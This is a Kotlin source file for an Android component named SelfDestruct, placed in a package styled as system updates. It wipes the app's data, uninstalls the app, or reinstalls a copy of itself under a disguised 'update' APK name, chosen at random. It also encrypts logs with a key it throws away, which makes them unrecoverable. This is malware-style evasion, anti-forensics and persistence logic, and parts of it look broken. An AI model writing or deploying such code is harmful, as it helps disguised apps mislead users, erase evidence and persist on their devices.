package com.system.updates

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.util.Base64
import java.io.File
import java.io.FileOutputStream
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SelfDestruct {
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x3F, 0x4E, 0x5D, 0x6C, 0x7B, 0x8A.toByte(), 0x99.toByte(), 0xA8.toByte())

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(ByteArray(32).also { r.nextBytes(it) }, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    fun wipeAppData(ctx: Context): Boolean {
        return try {
            val dir = ctx.filesDir
            dir.listFiles()?.forEach { it.delete() }
            val cacheDir = ctx.cacheDir
            cacheDir.listFiles()?.forEach { it.delete() }
            true
        } catch (e: Exception) {
            false
        }
    }

    fun uninstallSelf(ctx: Context): Boolean {
        return try {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:${ctx.packageName}")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            true
        } catch (e: Exception) {
            false
        }
    }

    fun scheduleDestruction(ctx: Context, delaySeconds: Long) {
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (shouldSelfHeal()) {
                selfHeal(ctx)
            } else {
                wipeAppData(ctx)
                uninstallSelf(ctx)
            }
        }, delaySeconds * 1000)
    }

    private fun shouldSelfHeal(): Boolean {
        return System.currentTimeMillis() % 2 == 0L
    }

    private fun selfHeal(ctx: Context) {
        try {
            val externalDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val newApkName = "update_${System.currentTimeMillis()}.apk"
            val newApkFile = File(externalDir, newApkName)

            val currentApkPath = ctx.packageCodePath
            val currentApk = File(currentApkPath)
            currentApk.copyTo(newApkFile, overwrite = true)

            val intent = Intent(Intent.ACTION_VIEW)
            intent.setDataAndType(Uri.fromFile(newApkFile), "application/vnd.android.package-archive")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)

            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                uninstallSelf(ctx)
            }, 5000)
        } catch (e: Exception) {
            uninstallSelf(ctx)
        }
    }

    fun encryptLog(log: String): String {
        val raw = log.toByteArray()
        val x = xor(raw)
        val enc = aesEnc(x)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }
}